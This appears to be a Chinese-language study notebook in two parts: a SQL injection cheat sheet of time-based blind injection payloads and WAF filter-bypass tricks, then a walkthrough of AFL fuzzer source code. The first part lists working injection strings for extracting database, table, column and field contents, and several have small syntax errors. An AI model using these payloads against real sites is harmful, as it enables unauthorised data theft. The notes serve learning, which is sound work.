# SQL注入

## 注入方式

### 延时注入

首先判断注入点：产生了延迟即证明存在延时注入

**1' and sleep(5)# **



爆出数据库：通过页面有没有睡眠，来判断数据库的名称，如果数据库第一个字母是s时 ，就会休眠5秒钟。

**1' and if(ascii(substr(database(),1,1))=115,1,sleep(10))#**



爆出数据表：

**1' and if( ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema="数据库"),1,1)))=101,sleep(5),1#**



根据表名爆出列名

**1' and if( ascii(substr((select group_concat(column_name) from information_schema.columns where table_name="数据表"),1,1)))=101,sleep(5),1#**



根据列名爆出数据

**1' and if(ascii(substr((select group_concat(0x7e,字段,0x7e) from "数据表"),1,1)))=101sleep(5),1#**

## 过滤绕过

### 绕过空格

两个空格代替一个空格

Tab代替空格

%a0代替空格

/**/代替空格

括号绕过空格

**select(user())from(dual)**

### 绕过引号

使用like:

**select ascii(mid(user(),1,1))=80 #**

等价于 **select user() like 'r%'#**

对于limit可以使用offset来绕过：

**select * from news limit 0,1 #**

等价于下面这条SQL语句 **select * from news limit 1 offset 0#**

使用join：

**union select 1,2#**

等价于 **union select * from (select 1)a join (select 2)b#**

### 绕过注释符

使用'闭合最后的单引号

**1' union select 1,2,'3**

### 绕过等于号

使用like 、rlike 、regexp

### 绕过union，select，where等

使用注释符绕过：

常用注释符：//，-- , /**/, #, --+, -- -, ;,%00,--a

**1' U// NION // SE// LECT //user，pwd from user#**

使用大小写绕过：

**1' UnIoN SeLeCT#**

双关键字绕过

**1' UNIunionONSeLselectECT1,2,3#**

# AFL Fuzz源码阅读

### detect_file_args

这个函数是将命令参数中的@@替换为真正的文件路径

```c++
EXP_ST void detect_file_args(char** argv) {

  u32 i = 0;
  u8* cwd = getcwd(NULL, 0);

  if (!cwd) PFATAL("getcwd() failed");

  while (argv[i]) {

    u8* aa_loc = strstr(argv[i], "@@");

    if (aa_loc) {

      u8 *aa_subst, *n_arg;

      /* If we don't have a file name chosen yet, use a safe default. */

      if (!out_file)
        out_file = alloc_printf("%s/.cur_input", out_dir);

      /* Be sure that we're always using fully-qualified paths. */

      if (out_file[0] == '/') aa_subst = out_file;
      else aa_subst = alloc_printf("%s/%s", cwd, out_file);

      /* Construct a replacement argv value. */

      *aa_loc = 0;
      n_arg = alloc_printf("%s%s%s", argv[i], aa_subst, aa_loc + 2);
      argv[i] = n_arg;
      *aa_loc = '@';

      if (out_file[0] != '/') ck_free(aa_subst);

    }

    i++;

  }

  free(cwd); /* not tracked */

}
```

首先用getcwd拿到当前路径

然后遍历argv，判断各个参数是否含有@@

有的话，首先判断有没有定义一个文件名，如果没有的话，就使用.cur_input

之后使用alloc_printf来生成一个新的字符串，替换原来的

### setup_stdio_file

假如在detect_file_args没有找到@@，就会跳到这里，设置好stdio_file

```c++
EXP_ST void setup_stdio_file(void) {

  u8* fn = alloc_printf("%s/.cur_input", out_dir);

  unlink(fn); /* Ignore errors */

  out_fd = open(fn, O_RDWR | O_CREAT | O_EXCL, 0600);

  if (out_fd < 0) PFATAL("Unable to create '%s'", fn);

  ck_free(fn);

}
```

使用的还是 .cur_input

### perform_dry_run

这个函数是测试输入的样例

```c++
while (q) {

  u8* use_mem;
  u8  res;
  s32 fd;

  u8* fn = strrchr(q->fname, '/') + 1;

  ACTF("Attempting dry run with '%s'...", fn);

  fd = open(q->fname, O_RDONLY);
  if (fd < 0) PFATAL("Unable to open '%s'", q->fname);

  use_mem = ck_alloc_nozero(q->len);

  if (read(fd, use_mem, q->len) != q->len)
    FATAL("Short read from '%s'", q->fname);

  close(fd);

  res = calibrate_case(argv, q, use_mem, 0, 1);
  ck_free(use_mem);
```

首先是一个循环，遍历整个输入样例的队列

然后先是打开文件，分配一块内存，将文件内容读入内存

然后调用calibrate_case进行测试

之后对测试的结果进行判断，有FAULT_NONE，FAULT_TMOUT，FAULT_CRASH等，这里就不详细说了

### calibrate_case

首先是一大堆设置参数什么的，这里就不详细说了

```c
if (dumb_mode != 1 && !no_forkserver && !forksrv_pid)
  init_forkserver(argv);
```

这里是判断forkserver是否启动了，没启动就将其启动

再跳过一部分不是很重要的代码

```c
write_to_testcase(use_mem, q->len);
```

这里是将testcase写到文件中去，感觉这里对磁盘的性能要求挺大的吧…….读小文件，写小文件….这里可以作为一个优化点，使用内存磁盘什么的，分一块不是很大的就够用了

```c
fault = run_target(argv, use_tmout);
`
```

这里就是真正的运行程序，里面的逻辑其实在分析afl-as.h的时候已经讲到了

其中有一个小细节就是，假如没有@@，就会将.cur_input的fd dup2到0上

```c
cksum = hash32(trace_bits, MAP_SIZE, HASH_CONST);
```

之后就是计算trace_bits的checksum，这里trace_bits就是共享内存

下面就是一些对测试样例性能的分析，把这个作为基准，详细的就不多说了

### cull_queue

这是一个用来设置favored entry的函数

```c++
struct queue_entry* q;
static u8 temp_v[MAP_SIZE >> 3];
u32 i;

if (dumb_mode || !score_changed) return;

score_changed = 0;

memset(temp_v, 255, MAP_SIZE >> 3);
```

首先是初始化temp_v（previously-unseen bytes）

```c++
while (q) {
  q->favored = 0;
  q = q->next;
}
```

之后将queue_entry中的所有favored设为0

```c++
for (i = 0; i < MAP_SIZE; i++)
  if (top_rated[i] && (temp_v[i >> 3] & (1 << (i & 7)))) {

    u32 j = MAP_SIZE >> 3;

    /* Remove all bits belonging to the current entry from temp_v. */

    while (j--) 
      if (top_rated[i]->trace_mini[j])
        temp_v[j] &= ~top_rated[i]->trace_mini[j];

    top_rated[i]->favored = 1;
    queued_favored++;

    if (!top_rated[i]->was_fuzzed) pending_favored++;

  }

q = queue;

while (q) {
  mark_as_redundant(q, !q->favored);
  q = q->next;
}
```

这里就是判断有没有没被temp_v所命中的bitmap，如果有，并且在top_rated中，就将其设为favored

### fuzz_one

这是一个函数，从准备fuzz的队列中拿出一项，用来fuzz，这个函数返回0就代表fuzz成功，1就代表这个被跳过或不要这一项了

```c++
if (pending_favored) {

    /* If we have any favored, non-fuzzed new arrivals in the queue,
       possibly skip to them at the expense of already-fuzzed or non-favored
       cases. */

    if ((queue_cur->was_fuzzed || !queue_cur->favored) &&
        UR(100) < SKIP_TO_NEW_PROB) return 1;
```

假如pending_favored为真，那么判断下当前从队列中拿出来的这一项是否被fuzz过，或者不是favired的，当这两个条件满足其中一项，就会随机一个0-100的数，假如随机到100才会继续下去（非常残酷啊）

```c++
else if (!dumb_mode && !queue_cur->favored && queued_paths > 10) {

    /* Otherwise, still possibly skip non-favored cases, albeit less often.
       The odds of skipping stuff are higher for already-fuzzed inputs and
       lower for never-fuzzed entries. */

    if (queue_cycle > 1 && !queue_cur->was_fuzzed) {

      if (UR(100) < SKIP_NFAV_NEW_PROB) return 1;

    } else {

      if (UR(100) < SKIP_NFAV_OLD_PROB) return 1;

    }

  }
```

然后假如满足不是dumb模式，当前项不是favored，并且等待fuzz的有10项以上，就会进入else if的流程中

假如当前项没被fuzz过，就有75%的几率跳过，被fuzz过就有95%的几率跳过

```c++
/* Map the test case into memory. */

fd = open(queue_cur->fname, O_RDONLY);

if (fd < 0) PFATAL("Unable to open '%s'", queue_cur->fname);

len = queue_cur->len;

orig_in = in_buf = mmap(0, len, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);

if (orig_in == MAP_FAILED) PFATAL("Unable to mmap '%s'", queue_cur->fname);

close(fd);
```

这部分是将当前的test case用mmap读进内存中

```c++
if (queue_cur->cal_failed) {

  u8 res = FAULT_TMOUT;

  if (queue_cur->cal_failed < CAL_CHANCES) {

    res = calibrate_case(argv, queue_cur, in_buf, queue_cycle - 1, 0);

    if (res == FAULT_ERROR)
      FATAL("Unable to execute target application");

  }

  if (stop_soon || res != crash_mode) {
    cur_skipped_paths++;
    goto abandon_entry;
  }

}
```

假如当前项有校准错误，并且校准错误次数小于3次，那么就用calibrate_case进行测试

```c++
/************
 * TRIMMING *
 ************/
if (!dumb_mode && !queue_cur->trim_done) {

  u8 res = trim_case(argv, queue_cur, in_buf);

  if (res == FAULT_ERROR)
    FATAL("Unable to execute target application");

  if (stop_soon) {
    cur_skipped_paths++;
    goto abandon_entry;
  }

  /* Don't retry trimming, even if it failed. */

  queue_cur->trim_done = 1;

  if (len != queue_cur->len) len = queue_cur->len;

}
memcpy(out_buf, in_buf, len);
```

这一部分就是对样例进行trimming，trim_case这个函数我们之后会进行分析

```c++
/*********************
 * PERFORMANCE SCORE *
 *********************/

orig_perf = perf_score = calculate_score(queue_cur);

/* Skip right away if -d is given, if we have done deterministic fuzzing on
   this entry ourselves (was_fuzzed), or if it has gone through deterministic
   testing in earlier, resumed runs (passed_det). */

if (skip_deterministic || queue_cur->was_fuzzed || queue_cur->passed_det)
  goto havoc_stage;

/* Skip deterministic fuzzing if exec path checksum puts this out of scope
   for this master instance. */

if (master_max && (queue_cur->exec_cksum % master_max) != master_id - 1)
  goto havoc_stage;

doing_det = 1;
```

这里是用calculate_score计算评分，然后下面是根据各种条件，然后直接跳到havoc那个变异阶段

```c++
for (stage_cur = 0; stage_cur < stage_max; stage_cur++) {

  stage_cur_byte = stage_cur >> 3;

  FLIP_BIT(out_buf, stage_cur);

  if (common_fuzz_stuff(argv, out_buf, len)) goto abandon_entry;

  FLIP_BIT(out_buf, stage_cur);
```